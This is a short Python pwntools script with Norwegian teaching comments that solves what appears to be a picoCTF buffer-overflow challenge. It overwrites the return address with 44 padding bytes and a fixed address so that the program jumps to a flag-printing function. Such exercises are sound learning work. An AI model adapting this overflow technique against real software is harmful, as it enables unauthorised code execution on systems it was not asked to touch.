# importerer pwntools biblioteket
# kan installeres med "pip install pwntools"
from pwn import *

# Enten så vil vi teste lokalt på programmet vi har fått eller så vil vi koble oss til den eksterne serveren.

# lager en prosess for det lokale programmet
io = process('./vuln')

# kobler til den eksterne serveren
#io = remote("saturn.picoctf.net", 50091)



# Vi fant ut at det kreves 44 bytes for å overskrive addressen som skal hoppes til. 1 byte er 1 karakter.
# Bruker b for å konvertere stringen til bytes.
payload = b"A"*44 

# Vi fant ut at denne addressen inneholder en funksjon som skriver ut flagget. Vi bruker p32 for å konvertere 
# addressen til bytes. Vi hadde brukt p64 hvis programmet var 64-bit.
payload += p32(0x080491f6)

# Vi venter med å gjøre noe før programmet har skrevet ut "Please enter your string: \n"
io.recvuntil(b"Please enter your string: \n")

# Vi sender payloaden vår til programmet
io.sendline(payload)

# Vi printer ut alt som blir skrevet ut av programmet, og tar tilbake kontrollen over terminalen
io.interactive()